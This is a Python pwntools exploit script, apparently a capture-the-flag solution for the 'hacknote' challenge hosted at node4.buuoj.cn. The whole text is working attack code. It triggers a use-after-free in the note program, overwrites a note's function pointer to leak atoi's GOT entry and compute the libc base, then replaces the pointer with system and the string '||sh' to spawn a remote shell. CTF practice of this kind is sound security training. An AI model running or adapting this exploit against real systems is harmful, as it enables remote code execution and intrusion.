from pwn import *

#context.log_level = 'debug'

#p = process('./hacknote')
p = remote('node4.buuoj.cn', 29741)
elf = ELF('hacknote')

#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

def add(size, content):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Note size :', str(size).encode())
    p.sendafter(b'Content :', content)

def delete(size):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(size).encode())

def show(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())

atoi_got = elf.got['atoi']
fake_puts = 0x804862b

add(0x18, b'a') #0
add(0x18, b'a') #1

delete(0)
delete(1)

add(0x8, p32(fake_puts) + p32(atoi_got)) #2
show(0)

atoi_real_addr = u32(p.recv(4))
libc_base = atoi_real_addr - libc.sym['atoi']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

delete(2)
add(0x8, p32(system) + b'||sh')
show(0)
p.interactive()